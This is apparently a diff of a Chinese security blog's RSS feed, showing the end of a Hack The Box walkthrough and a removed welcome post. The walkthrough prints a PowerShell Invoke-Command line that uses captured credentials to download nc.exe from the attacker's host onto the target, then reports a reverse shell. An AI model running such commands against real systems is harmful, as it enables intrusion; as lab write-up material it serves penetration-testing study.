+Invoke-WebRequest &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Uri&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &amp;lt;Uri&amp;gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Body&lt;/span&gt; &amp;lt;Object&amp;gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Certificate&lt;/span&gt; &amp;lt;X509Certificate&amp;gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-CertificateThumbprint&lt;/span&gt; &amp;lt;String&amp;gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ContentType&lt;/span&gt; &amp;lt;String&amp;gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Credential&lt;/span&gt; &amp;lt;PSCredential&amp;gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-DisableKeepAlive&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Headers&lt;/span&gt; &amp;lt;IDictionary&amp;gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-InFile&lt;/span&gt; &amp;lt;String&amp;gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-MaximumRedirection&lt;/span&gt; &amp;lt;Int32&amp;gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Method&lt;/span&gt; &amp;lt;WebRequestMethod&amp;gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;Default | Get | Head | Post | Put | Delete | Trace | Options | Merge | Patch&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-OutFile&lt;/span&gt; &amp;lt;String&amp;gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-PassThru&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Proxy&lt;/span&gt; &amp;lt;Uri&amp;gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ProxyCredential&lt;/span&gt; &amp;lt;PSCredential&amp;gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ProxyUseDefaultCredentials&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-SessionVariable&lt;/span&gt; &amp;lt;String&amp;gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-TimeoutSec&lt;/span&gt; &amp;lt;Int32&amp;gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-TransferEncoding&lt;/span&gt; &amp;lt;String&amp;gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;chunked | compress | deflate | &lt;span class=&quot;nb&quot;&gt;gzip&lt;/span&gt; | identity&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-UseBasicParsing&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-UseDefaultCredentials&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-UserAgent&lt;/span&gt; &amp;lt;String&amp;gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-WebSession&lt;/span&gt; &amp;lt;WebRequestSession&amp;gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &amp;lt;CommonParameters&amp;gt;]
+&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;我们先开启本地 kali 的 web 服务，将 nc.exe 放进对应文件夹，之后远程执行下列命令，从我们本地服务器将 nc 下载保存至用户 Chris 的目录下&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
+&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;Invoke-Command &lt;span class=&quot;nt&quot;&gt;-ComputerName&lt;/span&gt; sniper &lt;span class=&quot;nt&quot;&gt;-Credential&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$cred&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ScriptBlock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;hris&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&lt;span class=&quot;se&quot;&gt;\;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://10.10.15.11/nc.exe&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$output&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;sers&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;hris&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ocuments&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c.exe&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;Invoke-WebRequest &lt;span class=&quot;nt&quot;&gt;-Uri&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Outfile&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcp0r35n46j31e80na0z9.jpg&quot; alt=&quot;image-20200310183924496&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;再远程反弹 shell，成功&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcp0qosjh7j31e20gotfm.jpg&quot; alt=&quot;image-20200310184122085&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;总结&quot;&gt;总结&lt;/h2&gt;
+
+&lt;p&gt;上述即为整个越权反弹 shell 的内容，一些很基本的命令结合起来使用就能达到很神奇的效果。&lt;/p&gt;
+
+</description>
+        <pubDate>Tue, 10 Mar 2020 08:28:00 +0800</pubDate>
+        <link>http://localhost:4000/2020/03/10/PSCredential%E8%B6%8A%E6%9D%83%E5%8F%8D%E5%BC%B9shell/</link>
+        <guid isPermaLink="true">http://localhost:4000/2020/03/10/PSCredential%E8%B6%8A%E6%9D%83%E5%8F%8D%E5%BC%B9shell/</guid>
         
         <category>渗透测试</category>
         
@@ -726,52 +1182,6 @@ Exploit target:
         <category>HTB</category>
         
         <category>渗透测试</category>
-        
-        
-      </item>
-    
-      <item>
-        <title>Welcome to WuJ1n9 Blog</title>
-        <description>&lt;blockquote&gt;
-  &lt;p&gt;“Yeah It’s on. ”&lt;/p&gt;
-
-  &lt;p&gt;初次见面，请多指教。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;
-
-&lt;p&gt;2020 年，当了十几年考试机器， WuJ 想是时候写点东西了。&lt;/p&gt;
-
-&lt;p&gt;感谢 &lt;a href=&quot;https://github.com/Huxpro/huxpro.github.io&quot;&gt;Hux&lt;/a&gt; 的 &lt;a href=&quot;http://jekyllrb.com/&quot;&gt;Jekyll&lt;/a&gt; 模板，让搭建一个实用美观的博客如此简便。&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;正文&quot;&gt;正文&lt;/h2&gt;
-
-&lt;p&gt;步入研究生以来，一直被项目、论文牵扯，很多喜欢的东西都没能持续投入。也算是在新的一年下定决心，还是把时间花在自己感兴趣的事物上，所以决定写点东西。&lt;/p&gt;
-
-&lt;p&gt;博客应该主要会包含下面一些内容：&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;网络安全技术相关&lt;/li&gt;
-  &lt;li&gt;CTF wp&lt;/li&gt;
-  &lt;li&gt;渗透测试相关（HTB Walkthrough、实战等）&lt;/li&gt;
-  &lt;li&gt;逆向技术&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;当然可能主要还是对大佬的分享进行再加工，毕竟技术水平确实有限…&lt;/p&gt;
-
-&lt;h2 id=&quot;后记&quot;&gt;后记&lt;/h2&gt;
-
-&lt;p&gt;这个博客的诞生，纯粹是突发奇想，也希望自己能一直坚持下去，在复现和记录中更深刻地理解。&lt;/p&gt;
-
-&lt;p&gt;如果你恰好逛到了这里，希望你也能喜欢这里。&lt;/p&gt;
-</description>
-        <pubDate>Fri, 03 Jan 2020 02:48:00 +0800</pubDate>
-        <link>http://localhost:4000/2020/01/03/hello-2020/</link>
-        <guid isPermaLink="true">http://localhost:4000/2020/01/03/hello-2020/</guid>
-        
-        <category>生活</category>
         
         
       </item>
